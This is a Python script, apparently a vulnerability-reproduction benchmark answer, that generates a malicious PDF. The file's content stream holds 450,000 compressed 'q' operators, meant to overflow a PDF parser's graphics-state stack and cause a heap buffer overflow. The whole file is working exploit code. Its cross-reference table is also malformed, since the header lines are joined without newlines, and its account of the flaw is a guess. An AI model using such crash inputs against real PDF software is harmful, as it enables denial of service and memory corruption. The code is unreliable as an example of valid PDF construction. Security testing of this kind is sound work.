import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap buffer overflow in a PDF parser.

        The vulnerability description suggests an unchecked nesting depth when
        pushing a clip mark, leading to an overflow of a "layer/clip stack".
        In PDF context, this typically refers to the graphics state stack, which
        is managed by 'q' (save state) and 'Q' (restore state) operators.

        A common vulnerability is to have an unbounded number of 'q' operations
        without corresponding 'Q's, which overflows the fixed-size buffer often
        used to implement this stack. Since this stack is usually allocated on
        the heap, it results in a heap buffer overflow.

        To create a compact PoC, we generate a content stream containing a
        highly repetitive sequence of 'q ' operators. This sequence is then
        compressed using zlib (DEFLATE), which is standard for PDF's
        /FlateDecode filter. This results in a very small file size, while the
        uncompressed stream processed by the parser is large enough to trigger
        the buffer overflow. The ground-truth PoC's large size suggests a
        very high number of operations is necessary, which we replicate in the
        uncompressed payload.
        """
        
        # A large number of 'q' operators to overflow the graphics state stack.
        # The number is chosen to be in the ballpark of the uncompressed size
        # suggested by the ground-truth PoC length.
        num_q = 450000
        uncompressed_stream = b'q ' * num_q

        # The PDF /FlateDecode filter expects a raw DEFLATE stream.
        # zlib.compress with wbits=-15 produces this format.
        compressed_stream = zlib.compress(uncompressed_stream, level=9, wbits=-15)
        stream_len = len(compressed_stream)
        
        # The stream dictionary will specify the FlateDecode filter.
        filter_entry = b'/Filter /FlateDecode'

        # Build the PDF file structure piece by piece.
        parts = []
        
        # PDF header with a binary comment.
        parts.append(b'%PDF-1.7\n%\xa1\xb2\xc3\xd4\n')

        # List to store byte offsets of each object for the xref table.
        offsets = [0]

        # Object 1: Document Catalog.
        offsets.append(len(b''.join(parts)))
        parts.append(b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n')

        # Object 2: Page Tree Node.
        offsets.append(len(b''.join(parts)))
        parts.append(b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n')

        # Object 3: Page Object.
        offsets.append(len(b''.join(parts)))
        parts.append(b'3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R>>\nendobj\n')

        # Object 4: The malicious Content Stream.
        offsets.append(len(b''.join(parts)))
        stream_dict = b'4 0 obj\n<</Length %d %s>>\nstream\n' % (stream_len, filter_entry)
        parts.append(stream_dict)
        parts.append(compressed_stream)
        parts.append(b'\nendstream\nendobj\n')

        # Assemble the PDF body and find the starting offset of the xref table.
        body = b''.join(parts)
        xref_offset = len(body)

        # Create the cross-reference table.
        xref_lines = [
            b'xref',
            b'0 %d' % len(offsets),
            b'0000000000 65535 f \n'
        ]
        for offset in offsets[1:]:
            xref_lines.append(b'%010d 00000 n \n' % offset)
        xref = b''.join(xref_lines)

        # Create the file trailer.
        trailer = (
            b'trailer\n'
            b'<</Size %d/Root 1 0 R>>\n'
            b'startxref\n'
            b'%d\n'
            b'%%EOF'
        ) % (len(offsets), xref_offset)

        return body + xref + trailer